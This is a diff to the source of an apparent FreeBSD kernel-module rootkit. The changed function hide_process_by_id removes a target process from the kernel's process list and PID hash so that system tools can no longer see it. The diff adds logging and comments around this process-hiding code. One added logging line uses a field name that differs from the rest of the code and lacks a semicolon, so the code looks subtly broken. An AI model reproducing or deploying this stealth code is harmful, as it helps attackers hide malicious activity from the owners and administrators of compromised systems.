@@ -12,7 +12,7 @@
  * General Public License for more details.
  *
  * You should have received a copy of the GNU General Public License
- * along with this program. If not, see <http:www.gnu.org/licenses/>.
+ * along with this program. If not, see <http://www.gnu.org/licenses/>.
  */
 
 #include "hide.h"
@@ -31,7 +31,6 @@
 #include <sys/proc.h>
 #include <sys/sysent.h>
 #include <sys/sysproto.h>
-
 
 extern linker_file_list_t linker_files;
 extern struct sx kld_sx;
@@ -113,13 +112,21 @@ void hide_process_by_id(pid_t id){
 	struct proc *p;	
 	
 	sx_slock(&allproc_lock);
-
+	
+	/* Two options. Iterate over pidhashtabl, or allproc_list. 
+	*  Better performance over pidhashtabl */
 	LIST_FOREACH(p, PIDHASH(id), p_list){
-		if(p->p_pid == id){
-			if(p->p_state == PRS_NEW){ // Either NEW, NORMAL, ZOMBIE ( new in creation , see proc.h ) 
+		LOGI("Checking PID:%d\n", p->pid)
+		if(p->p_pid == id)
+		{
+			/* A process is either NEW, NORMAL, ZOMBIE 
+			*  ( new means in creation , see proc.h ) */
+			if(p->p_state == PRS_NEW)
+			{ 
 				p = NULL;
 				break;
 			}
+			LOGI("Found PID, Removing from p_list, p_hash\n")
 			PROC_LOCK(p);
 
 			LIST_REMOVE(p, p_list);
